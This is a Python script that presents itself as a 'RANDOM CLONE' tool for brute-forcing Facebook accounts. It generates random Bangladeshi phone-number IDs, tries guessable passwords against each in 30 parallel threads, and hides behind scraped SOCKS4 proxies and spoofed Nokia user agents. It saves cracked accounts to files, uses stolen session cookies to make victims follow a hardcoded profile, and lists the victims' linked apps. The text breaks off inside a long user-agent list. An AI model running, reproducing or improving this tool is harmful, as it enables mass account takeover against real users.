import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

G='\033[38;5;46m'
R='\033[38;5;196m'
B='\033[1;34m'
Y='\033[1;33m'
P='\033[38;5;203m'
W='\033[1;37m'
X='\033[1;30m'

      
logo = ("""\033[1;37m
\33[1;91m  ██████ \033[1;90m ██     \033[1;90m  █████ \033[1;90m  ██████\033[1;30m ██   ██
\33[1;91m  ██   ██\033[1;90m ██     \033[1;90m ██   ██\033[1;90m ██     \033[1;30m ██  ██
\33[1;91m  ██████ \033[1;90m ██     \033[1;90m ███████\033[1;90m ██     \033[1;30m █████
\33[1;91m  ██   ██\033[1;90m ██     \033[1;90m ██   ██\033[1;90m ██     \033[1;30m ██  ██
\33[1;91m  ██████ \033[1;90m ███████\033[1;90m ██   ██\033[1;90m  ██████\033[1;30m ██   ██
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : MD MORSHED             
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : MD MORSHED            
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE            
\033[1;30m───────────────────────────────────────────""")

def blackx():
	print('\033[1;30m───────────────────────────────────────────')
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
        os.system("clear")
        print(logo)
        print("\033[1;32m \x1b[1;92m\x1b[1;97m[\x1b[1;92mA\x1b[1;97m]\33[1;92m RANDOM CRACK")
        print(" \033[1;32m\x1b[1;92m\x1b[1;97m[\x1b[1;92mB\x1b[1;97m]\33[1;92m Exit")
        print('\033[1;30m───────────────────────────────────────────')
        Mumit =input("\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m Choose : ")
        if Mumit in ["1","A"]:
            fuck()
        if Mumit in [" 0", "B"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m EXAMPLE CODE: 017 | 018 | 019 | 016')
    print('\033[1;30m───────────────────────────────────────────')
    code = input('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m EXAMPLE: 2000 3000 5000 10000 ')
    print('\033[1;30m───────────────────────────────────────────')
    limit = int(input('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f' \033[1;32m[{R}⍣{G}]{G} SIM ID   {R}:{G} {code}')
        print(f' [{R}⍣{G}]{G} TOTAL ID {R}:{G} {tl}')
        print(f' \033[1;32m[{R}⍣{G}]{G} MIX IDZ CLONING ENJOY DEAR USER')
        print('\033[1;30m───────────────────────────────────────────')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(naim2,uid,pwx,tl)
    print('\033[1;30m───────────────────────────────────────────')
    print(' [+] OK Ids saved in BLACK/OK.txt')
    print(' [+] CP Ids saved in BLACK/CP.txt')
    print('\033[1;30m───────────────────────────────────────────')




        
        
agents=[]
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100007373957944', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
def naim2(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            agents = ['Mozilla/5.0 (Symbian/3; Series60/5.2 Nokia8950/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.6 Nokia3790/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.8 Nokia197/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia149/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.6 Nokia7577/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia289/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.8 Nokia4811/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.5 Nokia7081/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.8 Nokia2343/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.1 Nokia4386/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.7 Nokia4797/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.6 Nokia9291/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.2 Nokia5542/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.2 Nokia5332/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.1 Nokia7164/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.1 Nokia8965/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.7 Nokia2176/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.5 Nokia272/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.1 Nokia2408/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.3.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.4 Nokia1274/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.8 Nokia4259/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia4090/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.1 Nokia143/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.1 Nokia4616/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.3 Nokia2256/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.2 Nokia3071/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.4 Nokia9242/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia1148/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.8 Nokia1425/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.8 Nokia8024/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.1 Nokia8051/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia9653/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.7 Nokia9035/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia8995/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.8 Nokia1179/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.6 Nokia2734/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.3 Nokia9103/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.1 Nokia4268/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.3.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.7 Nokia2845/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.7 Nokia4049/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.4 Nokia6357/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.5 Nokia5237/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.1 Nokia4683/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.1 Nokia6277/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.1 Nokia2590/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.2 Nokia7370/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.1 Nokia3600/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.7 Nokia1232/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia1310/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.3.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.4 Nokia7524/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.6 Nokia2876/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.6 Nokia9763/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.4 Nokia4064/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.6 Nokia3523/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.4 Nokia2487/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.2 Nokia8096/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.5 Nokia6868/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.5 Nokia4121/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.8 Nokia5978/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.1 Nokia5340/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia9844/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.1.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.7 Nokia4069/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.5 Nokia6789/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia7290/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.7 Nokia865/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.7 Nokia7533/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.2 Nokia2461/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.2 Nokia5307/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.2.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.5 Nokia1901/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.5 Nokia9127/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.3 Nokia1579/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.7 Nokia6669/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.4 Nokia598/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.5 Nokia4333/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/6.2 Nokia479/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.7 Nokia5362/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.1.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.1 Nokia4228/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.2.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/2.2 Nokia4439/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/4.3 Nokia7302/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.3.2.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.4 Nokia2774/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/3.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.3 Nokia2460/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/1.1.3.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.6 Nokia8482/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.1.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.1 Nokia3309/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia7080/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.3 Nokia4057/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/7.5 Nokia474/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.3.1.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia8290/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.2.3.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.4 Nokia4081/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/4.2.1.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia2389/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.2.2 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/3.7 Nokia7367/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.3 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/8.2 Nokia7729/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/6.2.3.1 Mobile Safari/535.1', 'Mozilla/5.0 (Symbian/3; Series60/1.3 